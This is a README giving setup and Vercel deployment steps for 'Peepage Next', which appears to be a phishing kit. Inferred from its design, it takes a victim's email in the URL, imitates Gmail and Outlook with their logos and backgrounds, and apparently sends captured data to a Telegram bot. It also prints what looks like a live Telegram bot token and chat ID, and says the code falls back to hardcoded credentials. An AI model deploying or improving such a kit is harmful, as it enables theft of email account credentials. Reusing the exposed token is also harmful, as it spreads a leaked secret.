# Peepage Next

This is a Next.js application migrated from the original PHP Peepage.

## Getting Started

First, run the development server:

```bash
npm run dev
```

Open [http://localhost:3000/#test@gmail.com](http://localhost:3000/#test@gmail.com) with your browser to see the result.

## Customizing Assets

The application uses local assets found in `public/assets`.
- **Logos**: `public/assets/logos/` (e.g., `gmail.png`, `outlook.png`)
- **Backgrounds**: `public/assets/backgrounds/` (e.g., `gmail.jpg`, `outlook.jpg`)

## Deployment to Vercel

The easiest way to deploy this app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

### Step 1: Push to GitHub
1.  Initialize a git repository if you haven't already:
    ```bash
    git init
    git add .
    git commit -m "Initial commit"
    ```
2.  Create a new repository on GitHub (private or public).
3.  Push your code to GitHub.

### Step 2: Import to Vercel
1.  Go to [Vercel.com](https://vercel.com) and sign up/login.
2.  Click **"Add New..."** -> **"Project"**.
3.  Select "Continue with GitHub" and choose the repository you just created.
4.  **Configure Project**:
    - Framework Preset: **Next.js** (detected automatically).
    - **Environment Variables**:
      - You need to add your Telegram variables here for security.
      - `TELEGRAM_BOT_TOKEN` = `your_bot_token`
      - `TELEGRAM_CHAT_ID` = `your_chat_id`
5.  Click **Deploy**.

### Environment Variables
For security, it is best practice to move your API keys out of the code.
1.  Create a file named `.env.local` in the root directory.
2.  Add:
    ```
    TELEGRAM_BOT_TOKEN=8026009381:AAFo_eUPh2oz-tva8q63TuMLdJ9FqQqSwTU
    TELEGRAM_CHAT_ID=7452688597
    ```
3.  I have updated the code to check for these variables first, and fall back to the hardcoded ones if missing (for easy testing).
